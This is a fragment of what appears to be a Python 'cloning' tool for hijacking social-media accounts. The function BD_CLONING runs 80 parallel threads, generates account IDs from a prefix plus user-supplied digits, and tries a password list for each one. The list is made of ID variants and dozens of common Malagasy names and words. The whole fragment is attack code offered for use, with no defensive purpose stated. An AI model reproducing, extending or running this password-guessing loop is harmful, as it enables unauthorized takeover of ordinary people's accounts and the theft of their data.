...
def BD_CLONING():
    ...
    with tred(max_workers=80) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:],'fanantenana','Fanantenana','malala','Malala','solofo','Mahery','fenohery','Fenohery','Nantenaina','nantenaina','nahary','Nahary','malaso','Malaso','tsilavina','Tsilavina','solonandrasana','Solonandrasana','fifaliana','Fifaliana','mendrika','Mendrika','mandresy','lalaina','voary','mamisoa','miora','felana','diamondra','mamisoa','Solofo','randria','Randria','razafy','Razafy','valisoa','Valisoa','football','Football','tolotra','Tolotra','fanoherana','Fanoherana','marary','Marary','nasandratra','Nasandratra','solofoniaina','Solofoniaina','vadiko','Vadiko','mamako','Mamako','milely','Milely','mamiko','Mamiko','fahendrena','Fahendrena','fandresena','Fandresena','finoana','Finoana','fiderana','Fiderana','safidy','Safidy','tahiana','Tahiana','tsiferana','Tsiferana','fitiavana','Fitiavana','nomena','Nomena','Sitraka','sitraka','heriniaina','Heriniaina','mahery']
